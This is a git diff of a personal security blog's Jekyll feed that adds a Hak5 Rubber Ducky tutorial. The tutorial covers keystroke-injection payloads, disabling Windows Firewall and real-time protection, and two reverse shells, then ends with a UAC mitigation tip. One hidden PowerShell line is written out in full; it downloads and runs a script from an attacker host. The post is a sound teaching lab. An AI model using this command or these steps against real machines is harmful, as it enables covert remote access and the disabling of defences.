@@ -1,10 +1,10 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-01-11T03:03:34+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">nafsuuddini08.io</title><subtitle>This my blog where i post some projects and tutorials stuff.</subtitle><author><name>Nafsu Uddin</name></author><entry><title type="html">Hak5 - Rubber Ducky</title><link href="http://localhost:4000/hak5-rubberducky/" rel="alternate" type="text/html" title="Hak5 - Rubber Ducky" /><published>2022-01-11T00:00:00+01:00</published><updated>2022-01-11T00:00:00+01:00</updated><id>http://localhost:4000/hak5-rubberducky</id><content type="html" xml:base="http://localhost:4000/hak5-rubberducky/">&lt;p&gt;Rubber ducky by hak5 is a usb that simulates a keyboard that as soon as it is connected to a computer starts to write or perform the payload that we have indicated in a super fast way, in this article we will perform some payloads and attacks that we can perform and how to mitigate these types of attacks.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-01-12T02:29:47+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">nafsuuddini08.io</title><subtitle>This my blog where i post some projects and tutorials stuff.</subtitle><author><name>Nafsu Uddin</name></author><entry><title type="html">Hak5 - Rubber Ducky</title><link href="http://localhost:4000/hak5-rubberducky/" rel="alternate" type="text/html" title="Hak5 - Rubber Ducky" /><published>2022-01-11T00:00:00+01:00</published><updated>2022-01-11T00:00:00+01:00</updated><id>http://localhost:4000/hak5-rubberducky</id><content type="html" xml:base="http://localhost:4000/hak5-rubberducky/">&lt;p&gt;Rubber ducky by hak5 is a usb that simulates a keyboard that as soon as it is connected to a computer starts to write or perform the payload that we have indicated in a super fast way, in this article we will create some payloads and attacks that we can done and how to mitigate these types of attacks.&lt;/p&gt;
 
 &lt;p align=&quot;center&quot;&gt;
 &lt;img src=&quot;/assets/images/img-rubberd/portada1.jpg&quot; /&gt;
 &lt;/p&gt;
 
-&lt;p&gt;Here we can see the parts that make up the rubber ducky and the tools we need that are already included in the package we bought, which in this case is the micro-SD card, sd to usb adapter (to put our payloads on the micro-sd card to our pc) and the usb to mini usb adapter if we want to connect the rubber ducky to an andriod phone or tablet.&lt;/p&gt;
+&lt;p&gt;Here we can see the parts that make the rubber ducky and the tools we need that are already included in the package we bought, which in this case is the micro-SD card, sd to usb adapter (to put our payloads on the micro-sd card to our pc) and the usb to mini usb adapter if we want to connect the rubber ducky to an andriod phone or tablet.&lt;/p&gt;
 
 &lt;p align=&quot;center&quot;&gt;
 &lt;img src=&quot;/assets/images/img-rubberd/foto.png&quot; /&gt;
@@ -22,54 +22,170 @@
 &lt;img src=&quot;/assets/images/img-rubberd/captura2.png&quot; /&gt;
 &lt;/p&gt;
 
+&lt;p&gt;In the case if we want to encode our payloads on the terminal (which is my case) we will clone the repo that i mentioned above.&lt;/p&gt;
+
 &lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-rubberd/captura1.png&quot; /&gt;
+&lt;img src=&quot;/assets/images/img-rubberd/captura3.png&quot; /&gt;
 &lt;/p&gt;
+
+&lt;h2 id=&quot;my-first-ducky-payload&quot;&gt;My first ducky payload&lt;/h2&gt;
+
+&lt;p&gt;To start i am going to create a payload that opens the notepad that says “hello world”. if you want to copy the payloads that i have created remember that you have it in my github repo that i mentiones before. After doing some research to know how rubber ducky payloads works i realized that the syntax is very simple, since we have to understand that the rubber ducky is act like a keyboard. And always we ara going to use the following commands:&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;em&gt;Delay&lt;/em&gt;&lt;/strong&gt;: Pause for each seconds or milliseconds.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;em&gt;GUI r&lt;/em&gt;&lt;/strong&gt;: Win + r key (GUI for interface).&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;em&gt;STRING&lt;/em&gt;&lt;/strong&gt;: To write a text.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;em&gt;ENTER&lt;/em&gt;&lt;/strong&gt; : To press the ↲ key.&lt;/p&gt;
+
 &lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-rubberd/captura1.png&quot; /&gt;
+&lt;img src=&quot;/assets/images/img-rubberd/captura4.png&quot; /&gt;
 &lt;/p&gt;
+
+&lt;p&gt;And now to encode our payload we must use the following command that it’s shown in the image, and this command will create a file called &lt;strong&gt;&lt;em&gt;inject.bin&lt;/em&gt;&lt;/strong&gt; that we will have to move it in the micro-SD card.&lt;/p&gt;
+
 &lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-rubberd/captura1.png&quot; /&gt;
+&lt;img src=&quot;/assets/images/img-rubberd/captura5.png&quot; /&gt;
 &lt;/p&gt;
+
+&lt;p&gt;I move the &lt;strong&gt;&lt;em&gt;inject.bin&lt;/em&gt;&lt;/strong&gt; file on the micro-SD card that in my case it is the f:/ drive, and it’s very important that the micro-SD card only has this file inside because otherwise our payload will not work.&lt;/p&gt;
+
 &lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-rubberd/captura1.png&quot; /&gt;
+&lt;img src=&quot;/assets/images/img-rubberd/captura6.png&quot; /&gt;
 &lt;/p&gt;
+
+&lt;p&gt;And once moved the file we will disconnect the micro-SD card and insert it into the sd slot of the rubber ducky. And now let’s test our payload.&lt;/p&gt;
+
+&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/H1HflNU3o5U&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
+
+&lt;h2 id=&quot;rick-roll&quot;&gt;Rick Roll&lt;/h2&gt;
+
+&lt;p&gt;Now let’s try to create another payload that our rubber ducky will play a youtube video and with the command &lt;strong&gt;&lt;em&gt;STRING f&lt;/em&gt;&lt;/strong&gt; press the f key to show the video in full screen.&lt;/p&gt;
+
 &lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-rubberd/captura1.png&quot; /&gt;
+&lt;img src=&quot;/assets/images/img-rubberd/captura7.png&quot; /&gt;
 &lt;/p&gt;
+
+&lt;p&gt;We are going to encode the payload as we have done previously.&lt;/p&gt;
+
 &lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-rubberd/captura1.png&quot; /&gt;
+&lt;img src=&quot;/assets/images/img-rubberd/captura8.png&quot; /&gt;
 &lt;/p&gt;
+
+&lt;p&gt;And we are going to move the &lt;strong&gt;&lt;em&gt;inject.bin&lt;/em&gt;&lt;/strong&gt; in the sd card as we have done previously.&lt;/p&gt;
+
 &lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-rubberd/captura1.png&quot; /&gt;
+&lt;img src=&quot;/assets/images/img-rubberd/captura9.png&quot; /&gt;
 &lt;/p&gt;
+
+&lt;p&gt;When i run the payload with the rubber ducky it’s popup me an error and this is because my keyboard is spanish and not in english because the &lt;strong&gt;&lt;em&gt;duckencoder.jar&lt;/em&gt;&lt;/strong&gt; accepts english keyboard.&lt;/p&gt;
+
 &lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-rubberd/captura1.png&quot; /&gt;
+&lt;img src=&quot;/assets/images/img-rubberd/captura10.png&quot; /&gt;
 &lt;/p&gt;
+
+&lt;p&gt;So i decided to encode and download the payload in ducktoolkit that let’s us select the language that is on the keyboard, that in my case is in spanish.&lt;/p&gt;
+
 &lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-rubberd/captura1.png&quot; /&gt;
+&lt;img src=&quot;/assets/images/img-rubberd/captura11.png&quot; /&gt;
 &lt;/p&gt;
+
+&lt;p&gt;And now let’s test the payload if it works this time.&lt;/p&gt;
+
+&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/opPi95ocsJs&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
+
+&lt;h2 id=&quot;disable-windows-defender-firewall&quot;&gt;Disable windows defender firewall&lt;/h2&gt;
+
+&lt;p&gt;To start what i will do is to create a payload that will disable the windows defender firewall, the first thing will be execute the powershell as administrator because if we want to disable the firewall in powershell we need admin privileges to do that, and then we will execute the command &lt;strong&gt;&lt;em&gt;netsh&lt;/em&gt;&lt;/strong&gt; to disable the firewall.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;em&gt;LEFT ENTER&lt;/em&gt;&lt;/strong&gt;: Basically what i am indicating here is when the popup appears to execute the powershell as administrator that hit enter in “yes” option which the boton is on the left.&lt;/p&gt;
+
 &lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-rubberd/captura1.png&quot; /&gt;
+&lt;img src=&quot;/assets/images/img-rubberd/captura12.png&quot; /&gt;
 &lt;/p&gt;
+
+&lt;p&gt;Ok so we do all the process that we have done before when we encode the payloads and the sd card we are gon a put in the rubber ducky, And let’s see if the payload works.&lt;/p&gt;
+
+&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/Ta4lYag7DTw&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
+
+&lt;p&gt;In the payload i forgot to indicate to close the powershell windows, but i leave that for you to do that on your own.&lt;/p&gt;
+
+&lt;h2 id=&quot;reverse-shell&quot;&gt;Reverse Shell&lt;/h2&gt;
+
+&lt;p&gt;Ok now we are going to perform one of the most interesting attacks that an attackers can use, which is reverse shell. In this case i have created the following payload:&lt;/p&gt;
+
 &lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-rubberd/captura1.png&quot; /&gt;
+&lt;img src=&quot;/assets/images/img-rubberd/captura13.png&quot; /&gt;
 &lt;/p&gt;
+
+&lt;p&gt;The first thing i do to start create the payload it’s to disable the real-time protection on windows to avoid problems when we are gon a perform the reverse shell. I tried to look if there are commands to disable that option but i couldn’t find anything, so i had no alternative to indicate that to do it manually.&lt;/p&gt;
+
 &lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-rubberd/captura1.png&quot; /&gt;
+&lt;img src=&quot;/assets/images/img-rubberd/captura14.png&quot; /&gt;
 &lt;/p&gt;
+
+&lt;p&gt;In my case i am going to use the followong powershell script to execute the reverse shell on the client side that i found in the &lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell&quot;&gt;payload all the things&lt;/a&gt; repo.&lt;/p&gt;
+
 &lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-rubberd/captura1.png&quot; /&gt;
+&lt;img src=&quot;/assets/images/img-rubberd/captura15.png&quot; /&gt;
 &lt;/p&gt;
+
+&lt;p&gt;This is the second part of the payload we are going to use the following command to receive the shell from the victim machine in our attacker machine, This command is very simple what it does is download and execute the &lt;strong&gt;&lt;em&gt;ps1&lt;/em&gt;&lt;/strong&gt; on the victim machine, that this &lt;strong&gt;&lt;em&gt;ps1&lt;/em&gt;&lt;/strong&gt; file is gon a be hosted on our attacker machine with python or php. And in this case i use &lt;strong&gt;&lt;em&gt;hidden&lt;/em&gt;&lt;/strong&gt; so it doesn’t show that command is running.&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;powershell&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;hidden&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;IEX (New-Object Net.WebClient).DownloadString('http://192.168.118.131/payload.ps1');
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And now in our attacker’s machine we are going to create a temporal http server with python in one window to host our &lt;strong&gt;&lt;em&gt;ps1&lt;/em&gt;&lt;/strong&gt; script so that we can download in the victim machine, and on the other window we are going to be listening to receive the connection with netcat.&lt;/p&gt;
+
 &lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-rubberd/captura1.png&quot; /&gt;
+&lt;img src=&quot;/assets/images/img-rubberd/captura16.png&quot; /&gt;
 &lt;/p&gt;
+
+&lt;p&gt;And we are going to encode our payload as we have done before. And now let’s try our payload.&lt;/p&gt;
+
+&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/KhiJT_hwyAA&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
+
+&lt;h2 id=&quot;reverse-shell-2-with-msfvenom&quot;&gt;Reverse Shell 2 with msfvenom&lt;/h2&gt;
+
+&lt;p&gt;We have another option to make a reverse shell although i personally prefer the first one, but if you want you can do it this way. So the first thing we are going to do is create a windows reverse shell tcp payload with the &lt;strong&gt;&lt;em&gt;.exe&lt;/em&gt;&lt;/strong&gt; binary with &lt;strong&gt;&lt;em&gt;msfvenom&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
+
 &lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-rubberd/captura1.png&quot; /&gt;
+&lt;img src=&quot;/assets/images/img-rubberd/captura17.png&quot; /&gt;
 &lt;/p&gt;
+
+&lt;p&gt;This payload it is a bit long that it consists of three parts, the first is to disable the real time protection, the second is to execute with the command &lt;strong&gt;&lt;em&gt;certutil.exe&lt;/em&gt;&lt;/strong&gt; that comes by default on windows is to download the binary &lt;strong&gt;&lt;em&gt;revs.exe&lt;/em&gt;&lt;/strong&gt; (that i recommend that you download it in the temp directory) that will be hosted and the last part is using the command &lt;strong&gt;&lt;em&gt;Start-Process&lt;/em&gt;&lt;/strong&gt; to execute the &lt;strong&gt;&lt;em&gt;revs.exe&lt;/em&gt;&lt;/strong&gt; that will return the shell of the victim machine to our attacker machine.&lt;/p&gt;
+
 &lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-rubberd/captura1.png&quot; /&gt;
-&lt;/p&gt;</content><author><name>Nafsu Uddin</name></author><category term="Rubber ducky" /><category term="Linux" /><summary type="html">Rubber ducky by hak5 is a usb that simulates a keyboard that as soon as it is connected to a computer starts to write or perform the payload that we have indicated in a super fast way, in this article we will perform some payloads and attacks that we can perform and how to mitigate these types of attacks.</summary></entry><entry><title type="html">HTB - Horinzontall</title><link href="http://localhost:4000/htb-horizontall/" rel="alternate" type="text/html" title="HTB - Horinzontall" /><published>2022-01-06T00:00:00+01:00</published><updated>2022-01-06T00:00:00+01:00</updated><id>http://localhost:4000/htb-horizontall</id><content type="html" xml:base="http://localhost:4000/htb-horizontall/">&lt;p&gt;Horizontall is a linux machine with easy difficulty level both in the exploitation phase and the privilege escalation is cataloged as medium difficulty, this machine uses the cms strapi version 3.0 beta that has vulnerabilities such as RCE, changes users passwords, and also the machine has an http server running on port 8000 that is running laravel version 8 that has the vulnerability CVE-2021-3129 (RCE).&lt;/p&gt;
+&lt;img src=&quot;/assets/images/img-rubberd/captura18.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;And finally, as we have done previously, it is with python or php to create a temporal http server to download the &lt;strong&gt;&lt;em&gt;revs.exe&lt;/em&gt;&lt;/strong&gt; in the victim machine and in the second window is to listen with netcat.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-rubberd/captura19.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;We are going to encode the payload bla bla bla as we have done priviously. Now let’s try our payload!!!.&lt;/p&gt;
+
+&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/XHTN8yI43UU&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
+
+&lt;h2 id=&quot;how-to-mitigate-this-type-of-attacks&quot;&gt;How to mitigate this type of attacks?&lt;/h2&gt;
+
+&lt;p&gt;As we have seen, some of these attacks need administrator permission to be able to run and some people (and if not say the most of people) do not enable the option of requiring the password to run a program as administrator. And the attackers can take advantage of vulnerability.&lt;/p&gt;
+
+&lt;p&gt;To enable this option we will go to the windows registry editor, and here we have to &lt;strong&gt;&lt;em&gt;be careful&lt;/em&gt;&lt;/strong&gt; what we modify since it directly affects the system. In this case we are going to the following path that is showing in the image, and we click on &lt;strong&gt;&lt;em&gt;ConsentPromptBehaviorAdmin&lt;/em&gt;&lt;/strong&gt; and in the value option we are going to put &lt;strong&gt;&lt;em&gt;1&lt;/em&gt;&lt;/strong&gt; that will enable this option.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-rubberd/registry.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;And now if we are going to run a program as administrator it will ask us for the password. AND PLEASE DO NOT PUT A TYPICAL PASSWORD THAT IS EASY TO GUESS!!🤬.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-rubberd/password.png&quot; /&gt;
+&lt;/p&gt;</content><author><name>Nafsu Uddin</name></author><category term="Rubber ducky" /><category term="Linux" /><summary type="html">Rubber ducky by hak5 is a usb that simulates a keyboard that as soon as it is connected to a computer starts to write or perform the payload that we have indicated in a super fast way, in this article we will create some payloads and attacks that we can done and how to mitigate these types of attacks.</summary></entry><entry><title type="html">HTB - Horinzontall</title><link href="http://localhost:4000/htb-horizontall/" rel="alternate" type="text/html" title="HTB - Horinzontall" /><published>2022-01-06T00:00:00+01:00</published><updated>2022-01-06T00:00:00+01:00</updated><id>http://localhost:4000/htb-horizontall</id><content type="html" xml:base="http://localhost:4000/htb-horizontall/">&lt;p&gt;Horizontall is a linux machine with easy difficulty level both in the exploitation phase and the privilege escalation is cataloged as medium difficulty, this machine uses the cms strapi version 3.0 beta that has vulnerabilities such as RCE, changes users passwords, and also the machine has an http server running on port 8000 that is running laravel version 8 that has the vulnerability CVE-2021-3129 (RCE).&lt;/p&gt;
 
 &lt;p align=&quot;center&quot;&gt;
 &lt;img src=&quot;/assets/images/img-horizontall/portada.png&quot; /&gt;
